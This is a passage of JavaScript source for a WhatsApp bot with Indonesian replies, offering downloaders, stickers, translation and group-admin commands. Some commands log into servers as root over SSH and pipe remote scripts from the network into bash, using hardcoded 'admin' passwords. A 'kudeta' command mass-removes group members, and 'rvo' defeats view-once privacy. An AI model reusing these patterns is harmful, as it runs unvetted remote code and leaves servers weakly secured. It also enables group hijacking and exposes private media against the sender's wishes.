carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await FardanDev.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await FardanDev.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await FardanDev.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await FardanDev.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
let teks = `\n *#- ʟɪsᴛ ᴀʟʟ ɢʀᴏᴜᴘ ᴄʜᴀᴛ*\n`
let a = await FardanDev.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *ᴛᴏᴛᴀʟ ɢʀᴏᴜᴘ :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *ɴᴀᴍᴀ :* ${u.subject}
* *ᴍᴇᴍʙᴇʀ :* ${u.participants.length}
* *Status :* ${u.announce == false ? "ᴛᴇʀʙᴜᴋᴀ": "ʜᴀɴʏᴀ ᴀᴅᴍɪɴ"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "sᴜᴅᴀʜ ᴋᴇʟᴜᴀʀ"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("ʟɪɴᴋᴄʜɴʏᴀ"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await FardanDev.newsletterMetadata("invite", result)
let teks = `
* *ɪᴅ :* ${res.id}
* *ɴᴀᴍᴀ :* ${res.name}
* *ᴛᴏᴛᴀʟ ᴘᴇɴɢɪᴋᴜᴛ :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "ᴠᴇʀɪғɪᴇᴅ" ? "ᴛᴇʀᴠᴇʀɪғɪᴋᴀsɪ" : "ᴛɪᴅᴀᴋ"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await FardanDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: FardanDev.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await FardanDev.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://aemt.uk.to/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await FardanDev.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await FardanDev.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await FardanDev.downloadAndSaveMediaMessage(qmsg)
await FardanDev.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await FardanDev.downloadAndSaveMediaMessage(qmsg)
await FardanDev.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return FardanDev.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return FardanDev.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return FardanDev.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await FardanDev.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'skyzopedia.png');

let teks = directLink.toString()
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await FardanDev.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'skyzopedia.png');
let teks = directLink.toString()
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await FardanDev.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await FardanDev.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await FardanDev.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await FardanDev.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await FardanDev.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await FardanDev.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await FardanDev.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await FardanDev.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await FardanDev.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await FardanDev.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await FardanDev.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await FardanDev.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await FardanDev.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await FardanDev.newsletterMetadata("invite", result)
await FardanDev.newsletterFollow(res.id)
m.reply(`
*ʙᴇʀʜᴀsɪʟ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ*
* ɴᴀᴍᴀ ᴄʜᴀɴɴᴇʟ : *${res.name}*
* ᴛᴏᴛᴀʟ ᴘᴇɴɢɪᴋᴜᴛ : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*#- ʟɪsᴛ ᴏᴘsᴛɪᴏɴ ɢʀᴏᴜᴘ sᴇᴛᴛɪɴɢs*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_ᴀᴋᴛɪғ_" : "_ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ_"}\n`
})
teks += `\n ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`ʙᴇʀʜᴀsɪʟ *${command == "on" ? "ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ" : "ᴍᴇᴍᴀᴛɪᴋᴀɴ"} ${event}* ᴅɪ ɢʀᴜᴘ ɪɴɪ`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await FardanDev.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await FardanDev.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("ɢʀᴜᴘ ɪɴɪ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴍᴇᴍʙᴇʀ!")
await m.reply("ᴋᴜᴅᴇᴛᴀ ɢʀᴜᴘ ʙʏ ғᴜᴢᴀ sᴛᴏʀᴇ")
for (let i of memberFilter) {
await FardanDev.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("ᴋᴜᴅᴇᴛᴀ ᴛᴇʟᴀʜ ʙᴇʀʜᴀsɪʟ")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await FardanDev.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await FardanDev.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283861782741\n');
stream.write('https://whatsapp.com/channel/0029VawJGyl3mFYBda7Xx719\n');
stream.write('https://whatsapp.com/channel/0029VawJGyl3mFYBda7Xx719\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
